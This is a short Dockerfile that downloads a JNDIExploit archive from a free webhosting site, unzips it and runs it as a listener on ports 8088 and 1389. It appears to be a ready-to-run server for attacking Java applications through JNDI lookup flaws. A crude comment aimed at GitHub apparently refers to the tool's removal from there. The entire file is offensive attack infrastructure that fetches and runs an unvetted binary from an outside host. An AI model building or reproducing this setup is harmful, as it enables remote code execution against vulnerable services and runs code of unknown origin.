FROM openjdk:11
EXPOSE 8088
# RUN apk add wget curl unzip -y
WORKDIR /app
RUN wget https://jandiserver.000webhostapp.com/JNDIExploit.v1.2.zip  # FUCK YOU GITHUB.
RUN unzip JNDIExploit.*.zip && rm *.zip
EXPOSE 1389
CMD ["bash", "-c", "java -jar /app/JNDIExploit-*.jar -i 0.0.0.0 -p 8088"]
